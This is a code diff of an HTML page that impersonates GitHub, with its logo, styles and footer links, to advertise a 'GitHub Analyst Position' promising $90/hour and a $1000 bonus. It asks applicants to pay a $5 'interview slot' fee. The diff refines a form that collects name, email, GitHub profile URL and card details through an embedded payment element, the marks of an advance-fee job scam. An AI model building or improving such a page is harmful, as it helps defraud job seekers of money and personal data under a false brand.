@@ -5,23 +5,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GitHub Analyst Position - Interview Access</title>
     <link rel="stylesheet" href="https://unpkg.com/@primer/css@^20.2.4/dist/primer.css">
-    <link rel="stylesheet" href="styles.css">
-    <link rel="stylesheet" href="https://unpkg.com/@primer/octicons@^19.0.0/dist/octicons.css">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://js.stripe.com/v3/"></script>
 </head>
 <body>
     <header class="Header Header--dark">
-    <div class="Header-item">
-        <a href="https://github.com" class="Header-link">
-            <svg height="32" viewBox="0 0 16 16" width="32" class="octicon octicon-mark-github">
-                 <path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
-            </svg>
-        </a>
-    </div>
-    <div class="Header-item Header-item--full">GitHub Analyst Position</div>
-</header>
+        <div class="Header-item">
+            <a href="https://github.com" class="Header-link">
+                <svg height="32" viewBox="0 0 16 16" width="32" class="octicon octicon-mark-github">
+                    <path fill="white" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+                </svg>
+            </a>
+        </div>
+        <div class="Header-item Header-item--full">GitHub Analyst Position</div>
+    </header>
 
     <main class="container-lg px-3 my-5">
-        <section class="Box mb-5">
+    
+	<section class="Box mb-5">
             <div class="Box-body">
                 <h1 class="h2">$90/hour + $1000 Home Management Bonus</h1>
                 <p class="f4">Join GitHub's elite analyst team with premium compensation</p>
@@ -47,12 +48,10 @@
                     <li>Security and compliance expertise</li>
                 </ul>
             </div>
-
-            <div class="text-center my-6">
-                <a href="#apply" class="btn btn-primary btn-large p-3">Secure Interview Slot ($5 Fee)</a>
-            </div>
-        </div>
-        <div class="markdown-body">
+        <!-- Your existing content here -->
+        	<div class="text-center my-6">
+        <a href="#apply" class="btn btn-primary btn-large p-3">Secure Interview Slot ($5 Fee)</a>
+    </div>
     <section class="Box mb-5">
         <div class="Box-body">
             <h2 class="h1 mb-4">GitHub Analyst Position Details</h2>
@@ -135,7 +134,7 @@
     </section>
 
     <!-- Keep the existing Apply button -->
-
+    
         <section id="apply" class="Box mt-6">
             <div class="Box-header">
                 <h3 class="Box-title">Interview Application</h3>
@@ -145,21 +144,21 @@
                     <div class="form-group-body">
                         <div class="form-group">
                             <label class="form-label">Full Name</label>
-                            <input type="text" class="form-control" required>
+                            <input type="text" id="fullName" class="form-control" required>
                         </div>
                         <div class="form-group">
                             <label class="form-label">Email</label>
-                            <input type="email" class="form-control" required>
+                            <input type="email" id="email" class="form-control" required>
                         </div>
                         <div class="form-group">
                             <label class="form-label">GitHub Profile URL</label>
-                            <input type="url" class="form-control" required>
+                            <input type="url" id="githubUrl" class="form-control" required>
                         </div>
                         
-                        <!-- Payment Integration -->
                         <div class="form-group mt-4">
-                            <label class="form-label">Payment Method</label>
+                            <label class="form-label">Payment Details</label>
                             <div id="card-element" class="form-control"></div>
+                            <div id="card-errors" class="text-red mt-2" role="alert"></div>
                         </div>
                         
                         <button type="submit" class="btn btn-primary btn-block mt-4">
@@ -171,42 +170,75 @@
         </section>
     </main>
 
-    <script src="script.js"></script>
-    <!-- Include Stripe.js for payments -->
-    <script src="https://js.stripe.com/v3/"></script>
-</body>
-<footer class="footer container-lg px-3" role="contentinfo">
+    <footer class="footer container-lg px-3" role="contentinfo">
+        <!-- Previous footer code -->
+        	<footer class="footer container-lg px-3" role="contentinfo">
+
     <div class="border-top color-fg-muted pt-3 mt-3">
+
         <!-- Main Links -->
+
         <div class="d-flex flex-justify-center flex-wrap my-2">
+
             <ul class="list-style-none d-flex flex-wrap flex-items-center">
+
                 <li class="mr-3"><a href="https://docs.github.com/site-policy/github-terms/github-terms-of-service" class="Link--secondary">Terms</a></li>
+
                 <li class="mr-3"><a href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement" class="Link--secondary">Privacy</a></li>
+
                 <li class="mr-3"><a href="https://github.com/security" class="Link--secondary">Security</a></li>
+
                 <li class="mr-3"><a href="https://www.githubstatus.com/" class="Link--secondary">Status</a></li>
+
                 <li class="mr-3"><a href="https://docs.github.com" class="Link--secondary">Docs</a></li>
+
                 <li class="mr-3"><a href="https://support.github.com/contact" class="Link--secondary">Contact</a></li>
+
             </ul>
+
         </div>
+
+
 
         <!-- Cookie Preferences -->
+
         <div class="d-flex flex-justify-center flex-wrap my-2">
+
             <div class="d-flex flex-items-center">
+
                 <a href="https://github.com/manage/cookies" class="Link--secondary">Manage cookies</a>
+
                 <span class="mx-2 color-fg-muted">&middot;</span>
+
                 <span class="Link--secondary" onclick="alert('Preferences disabled for demo')">Do not share my personal information</span>
+
             </div>
+
         </div>
 
+
+
         <!-- Copyright with Icon -->
+
         <div class="d-flex flex-justify-center flex-items-center mt-4 mb-2">
+
     <a href="https://github.com" class="d-flex flex-items-center">
+
         <svg height="24" class="octicon octicon-mark-github mr-2" viewBox="0 0 16 16" width="24" aria-hidden="true">
+
              <path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+
         </svg>
+
     </a>
+
     <span class="text-small">© 2025 GitHub, Inc.</span>
+
 </div>
+
     </div>
+
 </footer>
+    <script src="script.js"></script>
+</body>
 </html>
